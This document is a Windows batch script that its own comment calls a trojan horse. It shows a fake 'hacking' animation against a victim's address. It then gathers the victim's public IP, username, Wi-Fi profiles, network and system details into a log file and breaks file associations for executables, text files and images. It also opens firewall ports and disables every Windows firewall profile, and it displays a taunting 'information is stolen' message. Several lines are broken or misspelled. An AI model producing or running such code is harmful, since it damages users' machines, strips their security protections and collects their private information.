@echo off
mode 1000
color 0a
cls
echo Finding IP address...
ipconfig /all
timeout /t 3 /nobreak >nul
echo Enter IP address / web name of victim:
set /p Target: = Target
echo Searching IP address...
nslookup %Target%
ping %Target% -n 65500 -l 12
echo Successful
echo Hacking in 3 seconds..
timeout/t 3 /nobreak >nul
cls
REM Now the trojan horse says it is searching for passwords...
echo Searching passwords /
timeout /t 1 /nobreak >nul
cls
echo Searching passwaords —
cls
echo Searching passwords |
timeout /t 1 /nobreak >nul
cls
echo Searching passwords —
timeout /t 1 /nobreak >nul
cls
echo Searching passwords \
echo Searching passwords /
timeout /t 1 /nobreak >nul
cls
echo Searching passwaords —
cls
echo Searching passwords |
timeout /t 1 /nobreak >nul
cls
echo Searching passwords —
timeout /t 1 /nobreak >nul
cls
echo Searching passwords \
echo Searching passwords /
timeout /t 1 /nobreak >nul
cls
echo Searching passwaords —
cls
echo Searching passwords |
timeout /t 1 /nobreak >nul
cls
echo Searching passwords —
timeout /t 1 /nobreak >nul
cls
echo Searching passwords \
echo Searching passwords /
timeout /t 1 /nobreak >nul
cls
echo Searching passwaords —
cls
echo Searching passwords |
timeout /t 1 /nobreak >nul
cls
echo Searching passwords —
timeout /t 1 /nobreak >nul
cls
echo Searching passwords \
timeout /t 5 /nobreak >nul
:real dirty work for stealing information
nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log
ver>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Username:%username%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Time: %time%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Date: %date%>>9K21JM10B.log
msg * Your information is stolen!!
assoc .txt = MER99RDUWFILE
assoc .jpeg = 9LKMFILE
assoc .jpg = NOTAPICTUREFILE
assoc .vbs = ggaieFILE
assoc .exe = NOTANAPPLICATIONFILE
ECHO.>>9K21JM10B.log
netsh wlan show profiles>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ipconfig>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Additional Information:>>9K21JM10B.log
ipconfig | find /i "IPv4">>9K21JM10B.log
wmic diskdrive get size>>9K21JM10B.log
wmic cpu get name>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
systeminfo>>9K21JM10B.log
goto ports
ren -=- Opens Port 1122 -=-
:ports
cls & color 0a
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
goto firewall
ren -=- Turns all Firewalls off -=-
:firewall
cls & color 0a
netsh firewall set opmode disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
